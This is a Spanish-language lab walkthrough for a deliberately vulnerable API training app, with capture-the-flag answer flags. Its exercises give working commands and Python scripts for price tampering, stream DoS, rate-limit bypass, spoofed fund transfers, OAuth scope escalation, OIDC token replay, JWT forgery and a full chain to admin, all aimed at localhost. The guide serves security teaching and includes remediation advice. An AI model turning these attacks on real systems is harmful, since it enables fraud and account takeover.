# Laboratorio 4 — Lógica de negocio, OAuth/OIDC, Rate limiting y Prompt injection (API4, API6, API10)

> **Perspectiva red team**: la fase de explotación **de lógica y confianza**. Aquí el atacante abusa de flujos de negocio (manipulación de precios, transferencias), debilidades de limitación de recursos, y la **confianza depositada en terceros** (OAuth/OIDC, token replay, red "segura"). Cierra con la **cadena de explotación completa** — de cero credenciales a admin total.

**Duración sugerida**: 2.5h · **Dificultad global**: Media–Compleja (último escalón)

> **Orden**: los retos fáciles de lógica (R20–R21) son el calentamiento; la progresión real está en **R23 (spoofing) → R24 (OAuth) → R25 (OIDC)** y termina en **R26 (cadena Boss)**. R24 alimenta R25 (secret + flujo) y R26 reutiliza R05/R06/R07/R09/R10/R11/R20.

| Reto | Tema | Dificultad |
|---|---|---|
| R20 | Manipulación de precio en la compra | Fácil |
| R21 | Resource consumption / DoS del stream | Fácil |
| R22 | Rate limit débil (per-worker) | Fácil–Media |
| R23 | Transferencia desde cuenta ajena (+ race) | Media |
| R24 | OAuth: secret en JWKS + escalada por scope | Media |
| R25 | OIDC: id_token sin verificación + replay | Compleja |
| R26 | Cadena de explotación completa (Boss) | Compleja |

## Objetivos de aprendizaje
1. Manipular entornos de **precio/descuento** en la compra (API6).
2. Explotar **race conditions** en transferencias de fondos (API6).
3. Abusar de **OAuth/OIDC**: secret en JWKS, escalada por scope, replay de id_token, nonce débil (API2).
4. Forzar **resource consumption** / bypass del rate limit (API4).
5. Encadenar vulnerabilidades (p. ej. Mass Assignment + BOLA → admin total).

> **¿Prefieres Burp Suite?** Este lab mezcla **Repeater** (lógica de precios, transferencias, rate limit) con **Intercept** (flujo OAuth/OIDC en el navegador proxyado) e **Intruder** (concurrencia/rate). Config y límites de Community en el **Anexo 7** del `README.md`.

> **¿Dónde está la flag?** Al completar un reto, la bandera ya viene **en la propia respuesta HTTP**: respuestas JSON con los campos `flag` (única) y `flags` (lista); respuestas no-JSON (HTML/SSE/archivos/redirects) con la cabecera `X-Flag`/`X-Flags`. Detalle en la sección 4 del `README.md`.
> **Retos con estado**: R22 entregará su flag al obtener el **200 tras un 429** (ventana del rate limit); R25 entrega `FH{oidc-token-replay}` la **segunda vez** que reenvías el mismo `id_token`; R26 entrega `FH{full-chain-admin}` cuando usas un token de una cuenta **ya escalada a admin** (mass assignment/BFLA). El estado es compartido entre los 4 workers.

---

## R20 — Manipulación de precio en la compra

**OWASP**: API6 · **Dificultad**: Fácil
**Prerequisitos**: R08 (conocer de quién es cada producto para comprar algo de otro). Sesión web de `jim` (el endpoint usa Flask-Login, no el Bearer).

**Objetivo**: comprar un producto por un precio que elige el cliente (no el servidor).

**Pasos**
1. Autentícate **por sesión web** (cookie) — el endpoint usa `current_user` de Flask-Login, así que el Bearer JWT no sirve aquí. Login vía web como `jim` (el/las compras las hace el cliente):
   ```bash
   curl -s -c /tmp/jims.txt -X POST http://localhost:5000/login \
     -d 'username=jim&password=password123' -o /dev/null
   ```
2. Compra un producto que **no** sea tuyo (producto 1 = Classic Tee de john, $25):
   ```bash
   curl -s -b /tmp/jims.txt -X POST http://localhost:5000/api/products/1/purchase \
     -H 'Content-Type: application/json' -d '{"discount_code":"SAVE99"}'
   ```
   → `paid_amount: 0.25` ($25 × 1%). Códigos aceptados en el código (sin validación server-side, app.py:3480): `SAVE10` (10%), `SAVE50` (50%), `SAVE99` (99%), `FREE` ($0.01).
3. **price_override**: fija tu propio precio de $120 a **$1.00** (el código fuerza mínimo $1.00, app.py:3473):
   ```bash
   curl -s -b /tmp/jims.txt -X POST http://localhost:5000/api/products/3/purchase \
     -H 'Content-Type: application/json' -d '{"price_override":0.01}'
   ```
   → `actual_price: 120.0`, `paid_amount: 1.0`.
4. **special_offer**: se activa si `special_offer=true` **y** el precio base supera $1000 (reduce a la mitad, app.py:3499). Crea un producto caro **con una sesión distinta de la que compra** (el endpoint de compra rechaza comprar tu propio producto, app.py:3459) y cómpralo con `jim`:
   ```bash
   # Crea la prenda cara ($2000) con la sesión de john (owner=john)...
   curl -s -c /tmp/johns.txt -X POST http://localhost:5000/login \
     -d 'username=john&password=password123' -o /dev/null
   NID=$(curl -s -b /tmp/johns.txt -X POST http://localhost:5000/api/secure/products \
     -H 'Content-Type: application/json' \
     -d '{"name":"Designer Coat","brand":"Lux","price":2000,"sku":"COAT-X"}' | jq -r '.id')
   # ...y cómprala con la sesión de jim (dueño ≠ comprador):
   curl -s -b /tmp/jims.txt -X POST http://localhost:5000/api/products/$NID/purchase \
     -H 'Content-Type: application/json' -d '{"special_offer":true}'
   ```
   → `actual_price: 2000.0`, `paid_amount: 1000.0`, `success: true`.

> ⚠️ **Ejemplo fallido (cómo NO se hace)**: si creas el producto con la **misma** sesión de `jim` que compra, el endpoint responde `{"error":"You cannot purchase your own product",...}` (app.py:3459) — el dueño y el comprador deben ser usuarios distintos.

**Prueba de éxito**: `success: true` con `paid_amount` muy por debajo de `actual_price` (verificado: $25 → $0.25 con SAVE99; $120 → $1.00 con price_override).

**Flag**: `FH{price-tampering}`

> **Con Burp**: captura el `POST /api/products/<id>/purchase` desde la UI (comprando un producto) → `Repeater`; cambia el body a `{"discount_code":"SAVE99"}`, `{"price_override":0.01}` o `{"special_offer":true}` y observa `actual_price` vs `paid_amount`.

**Remediación**: precio fijado en servidor sin inputs de precio/descuento del cliente; validar códigos contra tabla y por usuario; registrar el flujo completo de negocio.

---

## R21 — Resource consumption / DoS del stream

**OWASP**: API4 · **Dificultad**: Fácil
**Prerequisitos**: R02 (un JWT para `/api/stream/product-feed`).

**Objetivo**: generar una respuesta SSE desmedida con un `count` sin límite.

**Pasos**
```bash
curl -s "http://localhost:5000/api/stream/product-feed?count=100000" \
  -H "Authorization: Bearer $JWT" | wc -l
```
(No lances `99999999` en producción real del lab si no quieres saturar el worker — es demostrativo.)

**Prueba de éxito**: miles de líneas SSE devueltas con un solo request (el default es 1000; `count` no está acotado).

> Bonus: el gemelo `/api/stream/product-updates` (app.py:1174) falla con **500** — lee `request.args` *dentro* del generador y pierde el request context de Flask (`RuntimeError: Working outside of request context`). El que funciona es `/api/stream/product-feed`, que lee `count` antes de generar.

**Flag**: `FH{stream-dos}`

> **Con Burp**: un solo `GET /api/stream/product-feed?count=100000` en `Repeater`; el stream SSE empieza a descargar sin límite (puedes cerrar la pestaña cuando veas miles de líneas). El gemelo `/product-updates?count=10` da **500**.

**Remediación**: acotar `count`, reforzar con logging y rate limiting.

---

## R22 — Rate limit débil (in-memory, reseteable y por-worker)

**OWASP**: API4 · **Dificultad**: Fácil–Media
**Prerequisitos**: R02 (un JWT para probar `/api/products`, y la lección del rate limit de login por-worker).

**Objetivo**: demostrar que el limit de `/api/products` (5 req/min **por IP y por worker**) es in-memory, no se comparte entre los 4 workers de gunicorn, y se resetea cada 60s → el atacante sostiene mucho más de 5 req/min.

**Pasos**
1. Aprieta a fondo el endpoint (la carga se reparte entre los 4 workers, cada uno con su propio contador de 5/min; los 429 aparecen al llenarse los workers):
   ```bash
   JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
     -H 'Content-Type: application/json' -d '{"username":"john","password":"password123"}' \
     | jq -r .access_token)
   for i in $(seq 1 20); do
     curl -s -o /dev/null -w "%{http_code} " http://localhost:5000/api/products \
       -H "Authorization: Bearer $JWT"
   done; echo
   ```
   → empiezas a recibir `429` (con 4 workers un `200`/`429` se intercalan).
2. **Bypass esperando el reset**: cada contador vive 60s. Espera 60s y vuelve a disparar → de nuevo ~5/worker disponibles:
   ```bash
   sleep 61
   for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} " \
     http://localhost:5000/api/products -H "Authorization: Bearer $JWT"; done; echo
   ```
3. **Nota**: el code usa `request.remote_addr` (no `X-Forwarded-For`), así que rotar XFF **no** bypasea aquí; la debilidad real es el contador in-memory por-proceso (gunicorn `--workers 4`) + ventana corta reseteable. El `/api/products` duplicado registrado luego (app.py:2234) queda *ensombrecido* por el primero (Flask usa el primero), así que no hay una segunda ruta para bypassear — el medio es siempre el reset de 60s y el reparto multi-worker.

**Prueba de éxito**: tras el paso 1 ves 429s; tras `sleep 61` vuelves a obtener 200s — tasa sostenida muy superior a 5/min.

**Flag**: `FH{rate-limit-bypass}`

> **Con Burp**: manda `GET /api/products` a `Intruder` (modo **Sniper**, una posición vacía o un payload dummy) y repite ~20 veces; verás 200/429 alternados (contador por-worker). Tras ~60s los contadores se resetean y vuelves a tener 200s.

**Remediación**: rate limit server-side persistente (Redis) y por IP real de confianza + cuenta; sin confiar en memoria por-proceso.

---

## R23 — Transferencia desde cuenta ajena (spoofing del origen) + race condition

**OWASP**: API6 · **Dificultad**: Media
**Prerequisitos**: R02 (un JWT propio). R08 (conocer los usernames/IDs de las cuentas objetivo).

**Objetivo**: mover fondos desde una cuenta que **no** es la tuya indicando simplemente el `username` de origen en el body.

> El endpoint `POST /api/payments/transfer-username` (app.py:671) usa el `username` del body **como origen** (`source_user = User.query.filter_by(username=data['username'])`); la identidad del JWT solo se usa si no mandas `username`. Además el flujo hace `time.sleep(random 0–0.05)` entre leer y escribir el balance sin locking (app.py:745) — race teórico. Con **SQLite + gunicorn sync**, las escrituras se serializan (usa `--workers 4` de 1 request c/u), así que el doble-gasto NO es fiable aquí; la explotación práctica es el spoofing de origen.

**Pasos**
1. Saca el balance de john y jim (flat, sin auth, GraphQL):
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query -H 'Content-Type: application/json' \
     -d '{"query":"{ user }"}' | jq '.data.users[] | select(.username=="john" or .username=="jim") | {username, balance}'
   ```
2. Con tu propio JWT (puede ser `john`), transfiere **desde la cuenta de `superadmin`**:
   ```bash
   JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
     -H 'Content-Type: application/json' -d '{"username":"john","password":"password123"}' \
     | jq -r .access_token)
   curl -s -X POST http://localhost:5000/api/payments/transfer-username \
     -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
     -d '{"username":"superadmin","target_username":"jim","amount":5000}'
   ```
3. Comprueba el balance: superadmin −5000, jim +5000. Verificado en el desarrollo sin usar las credenciales de superadmin.

> Race condition (opcional, para debatir): con 100+ peticiones concurrentes se intenta el doble gasto, pero SQLite lo bloquea (OperationalError "database is locked"). En Postgres real SÍ se explota: dos lecturas simultáneas del mismo saldo pasan el `if from_balance < amount`, duplican el desembolso.

**Prueba de éxito**: la transferencia responde `{"message": ...}` y mueve fondos de `superadmin`→`jim` autenticado como `john`. Nadie verificó la identidad del origen.

**Flag**: `FH{race-condition-transfer}`

> **Con Burp**: en `Repeater` edita el body y mastica `source_username` a una cuenta ajena (`superadmin`) → `Repeater` (o `Intruder` con varias peticiones) para intentar la race; la respuesta de éxito mueve fondos desde el `username` que mandas sin verificar tu identidad. Recuerda: SQLite+sync NO permite el doble gasto real.

**Remediación**: el origen debe derivar SIEMPRE del token del autenticado (o requerir re-autenticación/OTP); transacción atómica con `SELECT ... FOR UPDATE` y auditoría.

---

## R24 — OAuth: fuga del secret HS256 (JWKS) y escalada por scope

**OWASP**: API2 · **Dificultad**: Media
**Prerequisitos**: R05 (concepto de secret de firma usado por la app). Credenciales seed del flujo (`john@example.com` / `password123`).

**Objetivo**: obtener el secret de firma del OAuth y forger/reutilizar tokens; luego escalar por `scope=admin`.

**Pasos (fuga de secret)**
1. Consulta `/oauth/jwks` del servidor OAuth:
   ```bash
   curl -s http://localhost:5001/oauth/jwks | jq .
   ```
   → `"payload": "oauth-server-jwt-secret-key-strong-2024"`. Ese es el secret con el que se firman los **ID tokens** (HS256, pese a declarar `alg: RS256`).

**Prueba de éxito**: el JSON expone el secret en claro.

**Flag**: `FH{oauth-jwks-secret-leak}`

> **Con Burp**: para la fuga, `GET http://localhost:5001/oauth/jwks` en `Repeater` muestra el secret en `keys[0].payload`. Para la escalada por scope, con el navegador proxyado **intercepta** los pasos `authorize`/`approve`/`token` y cambia `scope` a `openid admin`; el `id_token` emitido tendrá `sub:1` y `email:admin@vuln.internal` pese a loguear como john.

**Pasos (escalada por scope)**
2. Completa el flujo OAuth Authorization Code con PKCE pidiendo **`scope=openid admin`**. El servidor, al ver `admin` en el scope, **suplanta al primer admin** del sistema sin importar con qué cuenta te hayas logueado (oauth_server.py:742-759):
   ```bash
   python3 - <<'EOF'
   import requests, hashlib, base64, urllib.parse
   s = requests.Session()
   verifier = "Q" * 43
   chall = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
   base = "http://localhost:5001"; redir = "http://localhost:5000/oauth/callback"
   s.get(f"{base}/oauth/authorize", params={"client_id":"auto_client","redirect_uri":redir,
     "response_type":"code","scope":"openid admin","state":"st123","nonce":"n1",
     "code_challenge":chall,"code_challenge_method":"S256"})
   s.post(f"{base}/oauth/authorize", data={"email":"john@example.com","password":"password123",
     "client_id":"auto_client","redirect_uri":redir,"response_type":"code","scope":"openid admin","state":"st123"})
   r = s.post(f"{base}/oauth/approve", data={}, allow_redirects=False)
   code = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(r.headers["Location"]).query))["code"]
   r = s.post(f"{base}/oauth/token", data={"grant_type":"authorization_code","client_id":"auto_client",
     "client_secret":"strong_client_secret_here","code":code,"redirect_uri":redir,"code_verifier":verifier})
   tok = r.json()
   print("access_token:", tok["access_token"][:30], "...")
   print("id_token claims:", __import__("jwt").decode(tok["id_token"], options={"verify_signature":False}))
   EOF
   ```
   Tenías usuario `john`, pero el `id_token` emitido dice `sub: 1`, `email: admin@vuln.internal`.

**Prueba de éxito**: habiéndote autenticado como `john@example.com`, recibes un `id_token` con `sub: 1` y `email: admin@vuln.internal` — un token "admin" sin serlo.

**Flag**: `FH{oauth-scope-escalation}`

**Remediación**: scope mínimo necesario + mapeo de scope→claims estricto, sin secreto en JWKS (usar claves asimétricas de verdad con `alg` correcto).

---

## R25 — OIDC vulnerable: id_token sin verificación de firma + replay

**OWASP**: API2 · **Dificultad**: Compleja
**Prerequisitos**: R24 (obtener el `id_token` real del proveedor **y** el secret filtrado en JWKS).

**Objetivo**: forjar/reutilizar un `id_token` para autenticarse como otro usuario.

**Pasos (replay)**
1. Obtén un `id_token` real del proveedor (flujo completo de arriba con `scope=openid profile`). Guárdalo en `$IDTOKEN`.
2. Réplicalo las veces que quieras a `/api/auth/oauth-id-token-login` — **nunca se valida nonce ni uso** (`validate_oidc_token` app.py:1533 firma+iss+aud, sin nonce):
   ```bash
   curl -s -X POST http://localhost:5000/api/auth/oauth-id-token-login \
     -H 'Content-Type: application/json' -d '{"id_token":"'"$IDTOKEN"'"}'
   ```
   → devuelve un `access_token` con `sub`/`email` del dueño del token. Reenviarlo de nuevo también da 200 (replay confirmado).

**Pasos (forjado)**
3. Forja un `id_token` con el secret filtrado en R24 (HS256, iss/aud correctos = `http://oauth:5001`/`auto_client`) para **cualquier email**, incluido el admin:
   ```bash
   python3 - <<'EOF'
   import jwt, time
   p = {"iss":"http://oauth:5001","sub":"1","aud":"auto_client","email":"admin@vuln.internal",
        "name":"admin","iat":int(time.time()),"exp":int(time.time())+3600}
   print(jwt.encode(p, "oauth-server-jwt-secret-key-strong-2024", algorithm="HS256"))
   EOF
   ```
4. Reenvía ese token a `/api/auth/oauth-id-token-login` → access_token con `admin: true`, `sub: 1`.

**Prueba de éxito**: el endpoint acepta el mismo `id_token` dos veces (replay) y acepta un token firmado con el secret robado con claims arbitrarias (forjado admin) — verificado ambos en el lab.

**Flag**: `FH{oidc-token-replay}` · `FH{oidc-forged-idtoken}`

> **Con Burp**: guarda el `id_token` de `HTTP history` y reenvíalo dos veces a `POST /api/auth/oauth-id-token-login` (replay: las dos dan access_token). Para el forjado, base64url-decodifica con `Decoder`, forja en jwt.io el HS256 con el secret filtrado (`iss=http://oauth:5001`, `aud=auto_client`, `email=admin@vuln.internal`) y pega el token en `Repeater`.

**Remediación**: validar `nonce` (emitido por el RP en `authorize`), comprobar `auth_time`/`iat`, denylist de `jti` reutilizados, y firmar con claves asimétricas cuyo privado nunca se filtre.

---

## R26 — Cadena de explotación completa (Boss)

**OWASP**: API1+API3+API5+API6 · **Dificultad**: Compleja
**Prerequisitos**: **todo lo anterior**. En particular: R09 (mass assignment), R10 (BFLA), R07 (BOLA), R08/R11 (IDOR), R20 (price tampering), R05 (JWT forjado) y R06 (prompt injection). Es el reto que cierra la campaña: de cero credenciales a **admin total**.

**Objetivo**: desde cero (sin credenciales) conseguir acceso **admin total** y comprometer el balance de otro usuario, encadenando cuerda de fallos.

**Ruta sugerida**
1. **[R09] Mass Assignment**: registra `attacker` con `is_admin:true`:
   ```bash
   curl -s -X POST http://localhost:5000/api/auth/register \
     -H 'Content-Type: application/json' \
     -d '{"username":"bossr","password":"p","email":"boss@x.com","is_admin":true}'
   ```
2. **[R10] BFLA** (alternativa si falló el 1): promueve tu cuenta sin auth:
   ```bash
   curl -s -X POST http://localhost:5000/api/admin/promote -H 'Content-Type: application/json' \
     -d '{"username":"bossr"}'
   ```
3. **[R07] BOLA**: lee órdenes ajenas con tu token.
4. **[R08/R11] IDOR**: transfiere productos de otros a ti.
5. **[R20] Price tampering**: compra barato productos caros (si los creaste antes).
6. **[R05] JWT forjado** como "plan B" de acceso admin:
   ```bash
   python3 - <<'EOF'
   import jwt, time
   p = {"sub":"1","name":"admin","admin":True,"token_type":"oauth","auth_method":"oauth",
        "iat":int(time.time()),"exp":int(time.time())+3600,"iss":"fashion-api","aud":"fashion-app"}
   print(jwt.encode(p,"oauth-server-jwt-secret-key-strong-2024",algorithm="HS256"))
   EOF
   ```

**Prueba de éxito**: eres admin en `/api/secure/users/me`, controlas productos ajenos y has alterado balances via R06/R20 sin credenciales previas.

**Flag**: `FH{full-chain-admin}`

> **Con Burp**: combina los retos previos: `Repeater` para el registro con mass assignment y para promover/transferir/`price_override`; `Decoder`+jwt.io para el JWT forjado; y `Repeater` para cerrar la cadena con `transfer-username`/`chatbot` hasta ser admin total.

---

## Bonus — Remediación consolidada (para tu checklist)

**1. Autenticación (API2)**
- No credenciales por defecto; forzar cambio inicial.
- JWT: secret al azar solo por env, verificar `iss`/`aud`, `jti` + denylist, rotación real, TTL corto.
- Atributos de cookie: `HttpOnly`, `Secure`, `SameSite=Strict`.
- Rate limit de login por IP+cuenta con backoff y captcha.

**2. Autorización (API1, API3, API5)**
- Comprobar propiedad del objeto (BOLA) y roles (BFLA) **en cada endpoint**.
- No exponer campos innecesarios (password_hash, emails).
- Whitelist de campos en el constructor; rol/balance desde servidor.

**3. Validación de entrada**
- SQL: binds/params, nunca concatenar.
- Shell: nunca `shell=True` con input del usuario.
- GraphQL: motor seguro sin `eval`/`exec` sobre queries.
- Files: `secure_filename`, `realpath` bajo directorio permitido, validar MIME real.

**4. Lógica de negocio / concurrencia (API6)**
- Precio/descuento controlados en servidor.
- Transacciones atómicas + locks; auditoría de transferencias.

**5. Consumo de APIs externas (API10, API7)**
- Prompt injection: no mezclar instrucciones ejecutables de negocio con chat.
- SSRF: denylist de IPs privadas/metadata + allowlist de destinos.

**6. Configuración (API8)**
- `debug=False`, no secretos hardcodeados, sin endpoints de debug públicos, Swagger protegido.
- OAuth/OIDC: claves asimétricas reales, validación `aud`/`iss`/`nonce`/`state`, scope mínimo.

---

## Resumen de flags — Laboratorio 4

| Reto | Flag |
|---|---|
| R20 | `FH{price-tampering}` |
| R21 | `FH{stream-dos}` |
| R22 | `FH{rate-limit-bypass}` |
| R23 | `FH{race-condition-transfer}` |
| R24 | `FH{oauth-jwks-secret-leak}` + `FH{oauth-scope-escalation}` |
| R25 | `FH{oidc-token-replay}` + `FH{oidc-forged-idtoken}` |
| R26 | `FH{full-chain-admin}` |